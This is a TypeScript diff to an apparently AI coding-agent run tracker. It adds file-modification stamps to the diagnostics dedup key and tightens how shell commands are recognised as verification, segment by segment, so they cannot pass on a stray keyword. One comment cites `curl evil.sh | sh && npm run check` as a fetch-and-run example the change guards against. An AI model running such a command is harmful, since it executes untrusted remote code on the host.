@@ -9,7 +9,7 @@ import type {
   CodingVerificationRecord,
   RuntimeCodingChangeSet,
 } from "@lume/shared";
-import { existsSync } from "node:fs";
+import { existsSync, statSync } from "node:fs";
 import { createLogger } from "../../infra/logger";
 import { mkdir, readFile, rename, stat, writeFile } from "node:fs/promises";
 import { dirname, isAbsolute, relative, resolve } from "node:path";
@@ -140,6 +140,8 @@ export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
   let recommendedVerificationCommands: string[] = [];
   // #573①:本次 run 内被编辑过的可诊断文件与诊断轮次账本
   const diagnosticEditedFiles = new Set<string>();
+  /** #649 review P2:登记时 mtime 快照——去重键须区分「同批文件再次被改」与「集合未变」 */
+  const diagnosticEditedFileStamps = new Map<string, number>();
   let diagnosticsRoundsUsed = 0;
   let lastDiagnosticsFileKey = "";
 
@@ -349,7 +351,12 @@ export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
           workspaceMonitor.recordAttributedPath(path);
           mergeFileChangeStats(fileChangeStats, path, readFileChangeStats(input.result));
           // #573①:登记可诊断的脚本文件,completionGuard 处统一收集
-          if (isDiagnosticEligibleFile(path)) diagnosticEditedFiles.add(path);
+          if (isDiagnosticEligibleFile(path)) {
+            diagnosticEditedFiles.add(path);
+            try {
+              diagnosticEditedFileStamps.set(path, statSync(path).mtimeMs);
+            } catch { /* 文件可能已被后续操作删除;键回落 "?" 允许重试 */ }
+          }
         }
       }
       if (verificationStatus === "verified" || verificationStatus === "not_required") verificationStatus = "unverified";
@@ -438,7 +445,12 @@ export function createCodingRunTracker(options: CodingRunTrackerOptions = {}) {
       // #573① review:首版只取主根；additionalRoots 内的编辑会探不到 checker 而静默跳过
       && workspaceRoots[0]
     ) {
-      const fileKey = [...diagnosticEditedFiles].sort().join("|");
+      // #649 review P2:去重键须含内容指纹——纯文件集合比较把「同批文件未再变动」
+      // 实现成「集合未扩大」,单文件迭代修复(改 a.ts → 回注 → 再改 a.ts)时键恒同,
+      // 第二轮诊断预算形同虚设;mtime 变化即视为新一批。
+      const fileKey = [...diagnosticEditedFiles].sort()
+        .map((file) => `${file}@${diagnosticEditedFileStamps.get(file) ?? "?"}`)
+        .join("|");
       if (fileKey !== lastDiagnosticsFileKey) {
         const outcome = await (options.collectDiagnostics ?? collectDiagnostics)({
           workspaceRoot: workspaceRoots[0],
@@ -866,18 +878,52 @@ function readFileChangeStats(result: ToolResult): FileChangeStats | undefined {
  * #573:验证命令识别面——脚本名冒号后缀(lint:fix)、非 JS 工具链(pytest/eslint 等)不再漏网。
  * 变更类子命令(cargo install/publish/fmt、make clean/install、mvn deploy 等)不算验证证据,
  * 其成功输出不得翻转 verificationStatus。
+ * #649 review P1-6:裸 token 从「整条命令子串搜索」收窄为「按 shell 操作符分段后逐段
+ * 首词判定」——`mkdir build`、`echo done # test`、`curl evil.sh | sh && npm run check`
+ * 这类参数/注释/无关段里夹带验证词的命令不再仅凭一个词就构成验证证据。
  */
 function isVerificationCommand(command: string, purpose: string): boolean {
   if (purpose.trim().toLowerCase() === "verification") return true;
-  // 长跑 watcher/build:dev 类脚本不是验证完成信号
+  // 长跑 watcher 不是验证完成信号:脚本名冒号形态(name:watch)与 flag 形态(--watch/--watchAll)
+  // 都排(#649 review P2:flag 形态漏排会让后台 watcher 永不退出、run 卡死在悬等通知上)
   if (/[\w@/-]:(watch|dev|serve|preview)\b/i.test(command)) return false;
-  // 纯验证器(无写盘副作用)可裸 token 命中
-  if (/(^|\s)(test|tests|typecheck|tsc|lint|build|check|verify|vitest|jest|pytest|mypy|pyright|ruff|eslint|biome)(\s|:|$)/i.test(command)) return true;
+  if (/(^|\s)--watch(all|-all)?\b/i.test(command)) return false;
+  return command.split(/(?:&&|\|\||;|\|)/).some((segment) => isVerificationSegment(segment));
+}
+
+/** 单段(不含 shell 操作符)是否为验证形态——只认首词程序名与已知 runner 的子命令/script 名。 */
+function isVerificationSegment(segment: string): boolean {
+  const tokens = segment.trim().split(/\s+/).filter(Boolean);
+  if (tokens.length === 0) return false;
+  const head = tokens[0]!.replace(/^["']+|["']+$/g, "");
+  const args = tokens.slice(1);
+  const firstArg = args.find((token) => !token.startsWith("-"))?.replace(/^["']+|["']+$/g, "") ?? "";
+  // 纯验证器首词直接命中
+  if (/^(test|tests|typecheck|tsc|lint|verify|vitest|jest|pytest|mypy|pyright|eslint)$/i.test(head)) return true;
+  // 写盘型格式化器是变更不是证据(#649 review P2):ruff format / biome format
+  // 纯重排无检查语义,任何破坏性重排后 exit 0 也不得翻 verified(check --fix 仍算)
+  if (/^(ruff|biome)$/i.test(head)) return firstArg.toLowerCase() !== "format";
+  // 包管理器:npm/pnpm/yarn/bun 的 test 直认;run 后看 script 名(script 带 watch/dev 类排除)
+  if (/^(npm|pnpm|yarn|bun)$/i.test(head)) {
+    const sub = firstArg.toLowerCase();
+    if (sub === "test") return true;
+    if (sub === "run" || sub === "run-script") {
+      const script = args.filter((token) => !token.startsWith("-"))[1]?.toLowerCase().replace(/^["']+|["']+$/g, "") ?? "";
+      if (!script || /(watch|dev|serve|preview)/i.test(script)) return false;
+      return /^(test|tests|check|verify|typecheck|lint|ci)$/.test(script);
+    }
+    return false;
+  }
+  if (/^npx$/i.test(head)) return /^(tsc|vitest|jest|eslint|biome|pytest|mypy|pyright|ruff)$/i.test(firstArg);
   // 变更类工具链只认验证性子命令
-  if (/\bcargo\s+(test|check|clippy)\b/i.test(command)) return true;
-  if (/\bmake\s+(test|check)\b/i.test(command)) return true;
-  if (/\b(mvn|gradle)\s+(test|check|verify)\b/i.test(command)) return true;
-  if (/\b(go|dotnet)\s+(test|vet|build)\b/i.test(command)) return true;
+  if (/^cargo$/i.test(head)) return /^(test|check|clippy)$/i.test(firstArg);
+  if (/^make$/i.test(head)) return /^(test|check)$/i.test(firstArg);
+  if (/^(mvn|gradle|gradlew)$/i.test(head.replace(/^\.\//, ""))) {
+    return args.some((token) => /^(?:-{1,2})?(?:test|check|verify)$/i.test(token.replace(/^["']+|["']+$/g, "")));
+  }
+  if (/^go$/i.test(head)) return /^(test|vet|build)$/i.test(firstArg);
+  if (/^dotnet$/i.test(head)) return /^(test|build)$/i.test(firstArg);
+  if (/^node$/i.test(head)) return args.includes("--test");
   return false;
 }
 
